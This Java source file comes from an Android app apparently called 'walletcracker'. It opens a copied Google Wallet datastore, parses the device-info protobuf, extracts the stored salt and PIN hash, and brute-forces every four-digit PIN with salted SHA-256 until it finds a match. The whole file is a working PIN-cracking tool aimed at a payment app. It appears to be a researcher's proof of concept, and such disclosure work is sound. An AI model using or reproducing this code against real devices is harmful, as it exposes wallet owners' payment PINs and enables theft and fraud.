package com.zvelo.walletcracker;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import com.google.protobuf.ByteString;
import com.google.protobuf.Descriptors.EnumValueDescriptor;
import com.google.protobuf.Descriptors.FieldDescriptor;
import com.google.protobuf.InvalidProtocolBufferException;
import com.google.protobuf.Message;
import com.zvelo.walletcracker.GoogleWalletProtos.DeviceInfo;

import android.content.Context;
import android.util.Log;

public class DeviceInfoParser {
  protected static final String HEX_DIGITS = "0123456789abcdef";
  protected final String TAG = this.getClass().getSimpleName();
  protected Context _context;

  public DeviceInfoParser(Context context) {
    _context = context;
  }

  public List<Map<String, String>> execute() {
    WalletDatastoreCopyDbHelper db = null;
    try {
      db = new WalletDatastoreCopyDbHelper(_context);
      final byte deviceInfoRaw[] = db.getDeviceInfo();
      DeviceInfo deviceInfo = DeviceInfo.parseFrom(deviceInfoRaw);
      return parse(deviceInfo);
    } catch (InvalidProtocolBufferException e) {
      Log.e(TAG, "Error parsing: " + e.getMessage());
    } finally {
      if (db != null) {
        db.close();
      }
    }

    return null;
  }

  private List<Map<String, String>> parse(DeviceInfo deviceInfo) {
    List<Map<String, String>> data = new ArrayList<Map<String, String>>();
    data.addAll(addMessage("", deviceInfo));
    return data;
  }

  private List<Map<String, String>>addMessage(String prefix, Message message) {
    List<Map<String, String>> data = new ArrayList<Map<String, String>>();

    String salt = null, pinHash = null;

    for (Map.Entry<FieldDescriptor, Object> entry : message.getAllFields().entrySet()) {
      Map<String, String> ret = new HashMap<String, String>(2);
      final String fieldName = entry.getKey().getName();
      final String title = (prefix.equals("") ? "" : prefix + " => ") + fieldName;
      ret.put("title", title);

      String value;

      if (
//          fieldName.equals("state_transition_timestamp") ||
          fieldName.equals("updated_at_ms") ||
          fieldName.equals("secure_element_activation_timestamp_in_millis") ||
          fieldName.equals("setup_completion_time_in_millis")
      ) {
        Date d = new Date((Long) entry.getValue());
        ret.put("value", d.toString());
        data.add(ret);
      } else {
        switch (entry.getKey().getJavaType()) {
          case INT:
          case LONG:
          case FLOAT:
          case DOUBLE:
          case BOOLEAN:
          case STRING:
            value = entry.getValue().toString();
            if (fieldName.equals("salt")) {
              salt = value;
            }

            ret.put("value", value);
            data.add(ret);
            break;
          case ENUM:
            ret.put("value", ((EnumValueDescriptor) entry.getValue()).getName());
            data.add(ret);
            break;
          case BYTE_STRING:
            value = ((ByteString) entry.getValue()).toStringUtf8();
            if (fieldName.equals("pin_hash")) {
              pinHash = value;
            }
            ret.put("value", value);
            data.add(ret);
            break;
          case MESSAGE:
            data.addAll(addMessage(title, (Message) entry.getValue()));
            break;
        }
      }
    }

    if ((salt != null) && (pinHash != null)) {
      data.add(0, crackPin(prefix, salt, pinHash));
    }

    return data;
  }

  private Map<String, String> crackPin(String prefix, String salt, String hash) {
    Map<String, String> ret = new HashMap<String, String>(2);
    final String title = (prefix.equals("") ? "" : prefix + " => ") + "PIN";
    ret.put("title", title);

    for (Integer i = 0; i < 10000; ++i) {
      String pin = String.format("%04d", i);
      try {
        byte calc[] = MessageDigest.getInstance("SHA256").digest((i.toString()+salt).getBytes());

        StringBuffer hex = new StringBuffer();
        for (final byte b : calc) {
          hex.append(HEX_DIGITS.charAt((b & 0xF0) >> 4)).append(HEX_DIGITS.charAt((b & 0x0F)));
        }

        String calcHash = hex.toString();
        if (calcHash.toLowerCase().equals(hash.toLowerCase())) {
          ret.put("value", pin.toString());
          return ret;
        }
      } catch (NoSuchAlgorithmException e) {
        Log.e(TAG, "no such algorithm");
      }
    }

    ret.put("value", "Could not compute PIN");
    return ret;
  }

}
